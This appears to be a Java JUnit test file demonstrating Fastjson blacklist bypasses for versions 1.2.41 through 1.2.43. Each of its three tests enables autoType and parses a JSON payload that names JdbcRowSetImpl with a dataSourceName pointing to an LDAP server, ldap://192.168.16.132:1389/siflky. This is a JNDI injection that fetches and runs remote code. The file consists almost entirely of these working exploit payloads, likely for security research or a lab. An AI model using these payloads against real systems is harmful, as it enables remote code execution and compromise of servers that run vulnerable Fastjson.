import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_blacklist {
    @Test
    public void demo_41() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_41 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://192.168.16.132:1389/siflky\", \"autoCommit\":true}";
        Object parse = JSON.parse(v1_2_41);
    }

    @Test
    public void demo_42() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_42 = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://192.168.16.132:1389/siflky\", \"autoCommit\":true}";
        Object parse = JSON.parse(v1_2_42);
    }

    @Test
    public void demo_43() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_43 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://192.168.16.132:1389/siflky\", \"autoCommit\":true}";
        Object parse = JSON.parse(v1_2_43);
    }
}
